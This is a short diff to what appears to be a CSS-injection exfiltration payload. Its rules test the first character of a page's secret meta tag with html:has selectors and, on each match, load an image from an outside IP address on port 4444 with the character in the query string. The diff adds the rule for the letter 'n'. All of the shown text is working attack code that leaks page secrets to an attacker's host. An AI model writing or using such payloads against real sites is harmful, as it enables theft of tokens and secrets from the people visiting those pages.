@@ -23,3 +23,7 @@ html:has(meta[name=secret][content^=c]) {
 html:has(meta[name=secret][content^=d]) {
     background-image: url(http://167.99.47.105:4444?char=d);
 }
+
+html:has(meta[name=secret][content^=n]) {
+    background-image: url(http://167.99.47.105:4444?char=n);
+}
